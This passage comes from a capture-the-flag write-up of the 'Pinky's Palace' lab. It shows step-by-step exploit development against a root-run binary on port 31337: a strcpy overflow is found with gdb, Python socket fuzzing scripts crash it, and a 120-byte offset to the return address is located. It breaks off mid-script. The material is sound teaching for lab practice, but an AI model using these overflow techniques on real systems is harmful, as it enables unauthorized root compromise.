&lt;p&gt;By listing the writable files was found a rare binary, which also runs with root permissions.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;demon@Pinkys-Palace:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;-writable&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f 2&amp;gt;/dev/null | egrep &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'sys|proc'&lt;/span&gt;
/daemon/panel
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;demon@Pinkys-Palace:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ps aux | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; /daemon/panel | &lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; +2
root        479  0.0  0.1   4040   736 ?        Ss   17:58   0:00 /daemon/panel
root        483  0.0  0.0   4040    84 ?        S    17:58   0:00 /daemon/panel
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We download it to the attacking machine.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;scp &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; 4655 &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; pinky_rsa demon@192.168.179.178:/daemon/panel panel 
Enter passphrase &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;key &lt;span class=&quot;s1&quot;&gt;'pinky_rsa'&lt;/span&gt;: 
panel                                                           100%   13KB   2.9MB/s   00:00 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We grant execution permissions, and execute the binary.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x panel
root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./panel

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We see that is running locally on port 31337, as on the target machine.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/tr0ll2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ss &lt;span class=&quot;nt&quot;&gt;-ntpl&lt;/span&gt;
LISTEN         0              5                            0.0.0.0:31337                      0.0.0.0:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;            &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;panel&quot;&lt;/span&gt;,pid&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;18376,fd&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;3&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;
&lt;h3 id=&quot;binary-exploitation&quot;&gt;Binary Exploitation&lt;/h3&gt;

&lt;p&gt;With gdb we disassemble the binary and list the functions.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gdb &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; ./panel
Reading symbols from ./panel...
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;No debugging symbols found &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; ./panel&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;info functions
All defined functions:

Non-debugging symbols:
0x0000000000400718  _init
0x0000000000400740  recv@plt
0x0000000000400750  strcpy@plt
0x0000000000400760  setsockopt@plt
0x0000000000400770  strlen@plt
0x0000000000400780  htons@plt
0x0000000000400790  send@plt
0x00000000004007a0  &lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt;@plt
0x00000000004007b0  memset@plt
0x00000000004007c0  close@plt
0x00000000004007d0  listen@plt
0x00000000004007e0  &lt;span class=&quot;nb&quot;&gt;bind&lt;/span&gt;@plt
0x00000000004007f0  accept@plt
0x0000000000400800  &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;@plt
0x0000000000400810  &lt;span class=&quot;nb&quot;&gt;wait&lt;/span&gt;@plt
0x0000000000400820  fork@plt
0x0000000000400830  socket@plt
0x0000000000400840  _start
0x0000000000400870  deregister_tm_clones
0x00000000004008b0  register_tm_clones
0x00000000004008f0  __do_global_dtors_aux
0x0000000000400910  frame_dummy
0x0000000000400936  fatal
0x0000000000400964  handlecmd
0x00000000004009ab  main
0x0000000000400b90  __libc_csu_init
0x0000000000400c00  __libc_csu_fini
0x0000000000400c04  _fini
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;strong&gt;handlecmd&lt;/strong&gt; function in probably taking user input, we disassemble this function to see what it contains.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;disas handlecmd
Dump of assembler code &lt;span class=&quot;k&quot;&gt;for function &lt;/span&gt;handlecmd:
   0x0000000000400964 &amp;lt;+0&amp;gt;:     push   rbp
   0x0000000000400965 &amp;lt;+1&amp;gt;:     mov    rbp,rsp
   0x0000000000400968 &amp;lt;+4&amp;gt;:     add    rsp,0xffffffffffffff80
   0x000000000040096c &amp;lt;+8&amp;gt;:     mov    QWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x78],rdi
   0x0000000000400970 &amp;lt;+12&amp;gt;:    mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x7c],esi
   0x0000000000400973 &amp;lt;+15&amp;gt;:    mov    rdx,QWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x78]
   0x0000000000400977 &amp;lt;+19&amp;gt;:    lea    rax,[rbp-0x70]
   0x000000000040097b &amp;lt;+23&amp;gt;:    mov    rsi,rdx
   0x000000000040097e &amp;lt;+26&amp;gt;:    mov    rdi,rax
   0x0000000000400981 &amp;lt;+29&amp;gt;:    call   0x400750 &amp;lt;strcpy@plt&amp;gt;
   0x0000000000400986 &amp;lt;+34&amp;gt;:    lea    rax,[rbp-0x70]
   0x000000000040098a &amp;lt;+38&amp;gt;:    mov    rdi,rax
   0x000000000040098d &amp;lt;+41&amp;gt;:    call   0x400770 &amp;lt;strlen@plt&amp;gt;
   0x0000000000400992 &amp;lt;+46&amp;gt;:    mov    rdx,rax
   0x0000000000400995 &amp;lt;+49&amp;gt;:    lea    rsi,[rbp-0x70]
   0x0000000000400999 &amp;lt;+53&amp;gt;:    mov    eax,DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x7c]
   0x000000000040099c &amp;lt;+56&amp;gt;:    mov    ecx,0x0
   0x00000000004009a1 &amp;lt;+61&amp;gt;:    mov    edi,eax
   0x00000000004009a3 &amp;lt;+63&amp;gt;:    call   0x400790 &amp;lt;send@plt&amp;gt;
   0x00000000004009a8 &amp;lt;+68&amp;gt;:    nop
   0x00000000004009a9 &amp;lt;+69&amp;gt;:    leave  
   0x00000000004009aa &amp;lt;+70&amp;gt;:    ret
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can see the vulnerable function &lt;strong&gt;strcpy&lt;/strong&gt;, I will try to cause a crash by sending a string of 200 characters, in gdb-peda it is possible to generate a string with a specified length, and locate the &lt;strong&gt;rip&lt;/strong&gt; instruction.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;pattern_create 200                                                                                                                                        
&lt;span class=&quot;s1&quot;&gt;'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAU
AArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'&lt;/span&gt;  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I wrote a python script to send this string of 200 bytes.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;127.0.0.1&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;31337&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'latin'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Done&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Error&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We run the &lt;strong&gt;panel&lt;/strong&gt; binary in gdb-peda.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;run                                            
Starting program: /root/pinkyspalace2/panel              
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Attaching after process 197786 fork to child process 197796]
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;New inferior 2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;process 197796&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;                    
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Detaching after fork from parent process 197786]    
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Inferior 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;process 197786&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; detached]
Thread 2.1 &lt;span class=&quot;s2&quot;&gt;&quot;panel&quot;&lt;/span&gt; received signal SIGSEGV, Segmentation fault.                                                                                                     
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Switching to process 197796]                                                                                                                                       
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We run the script.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 fuzz.py             
Done
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As we can see this has caused a segmentation fault, also we can locate the exactly length to overwrite the return address.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;----------------------------------registers-----------------------------------&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;                                                                                    
RAX: 0xc8                                                                                                                                                           
RBX: 0x0                                                                                                                                                            
RCX: 0x7ffff7ee5e7c &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&amp;lt;__libc_send+28&amp;gt;:  cmp    rax,0xfffffffffffff000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                              
RDX: 0xc8                                                                                                                                                           
RSI: 0x7fffffffd2d0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;AAA%AAsAABAA&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$AAnAACAA&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAm
AARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                                        
RDI: 0x4                                                                                                                                                            
RBP: 0x41414e4141384141 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'AA8AANAA'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                                                                
RSP: 0x7fffffffd348 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
RIP: 0x4009aa &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&amp;lt;handlecmd+70&amp;gt;:  ret&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
R8 : 0x0 
R9 : 0x0 
R10: 0x0 
R11: 0x246 
R12: 0x400840 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&amp;lt;_start&amp;gt;:        xor    ebp,ebp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
R13: 0x0 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10203 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CARRY parity adjust zero sign &lt;span class=&quot;nb&quot;&gt;trap &lt;/span&gt;INTERRUPT direction overflow&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-------------------------------------code-------------------------------------&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
   0x4009a3 &amp;lt;handlecmd+63&amp;gt;:     call   0x400790 &amp;lt;send@plt&amp;gt;
   0x4009a8 &amp;lt;handlecmd+68&amp;gt;:     nop
   0x4009a9 &amp;lt;handlecmd+69&amp;gt;:     leave  
&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 0x4009aa &amp;lt;handlecmd+70&amp;gt;:     ret    
   0x4009ab &amp;lt;main&amp;gt;:     push   rbp
   0x4009ac &amp;lt;main+1&amp;gt;:   mov    rbp,rsp
   0x4009af &amp;lt;main+4&amp;gt;:   sub    rsp,0x1050
   0x4009b6 &amp;lt;main+11&amp;gt;:  call   0x400820 &amp;lt;fork@plt&amp;gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;------------------------------------stack-------------------------------------&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
0000| 0x7fffffffd348 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
0008| 0x7fffffffd350 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
0016| 0x7fffffffd358 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
0024| 0x7fffffffd360 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
0032| 0x7fffffffd368 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
0040| 0x7fffffffd370 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
0048| 0x7fffffffd378 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
0056| 0x7fffffffd380 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;AuAAXAAvAAYAAwAAZAAxAAyA&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;------------------------------------------------------------------------------&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004009aa &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;handlecmd &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
gdb-peda&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We locate the exact offset at 120 bytes.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;pattern_offset jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA found at offset: 120
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We run the binary again in gdb-peda.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gdb &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; ./panel
Reading symbols from ./panel...           
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;No debugging symbols found &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; ./panel&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;   
gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;r                               
Starting program: /root/pinkyspalace2/panel
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Attaching after process 10265 fork to child process 10269]
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;New inferior 2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;process 10269&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;                       
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Detaching after fork from parent process 10265]       
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Inferior 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;process 10265&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; detached] 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We rebuild the python script, this time adding the offset with 120 A’s and then with 6 B’s, to check if we take control of the return address.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;127.0.0.1&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;31337&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;120&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;B&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'latin'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Done&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
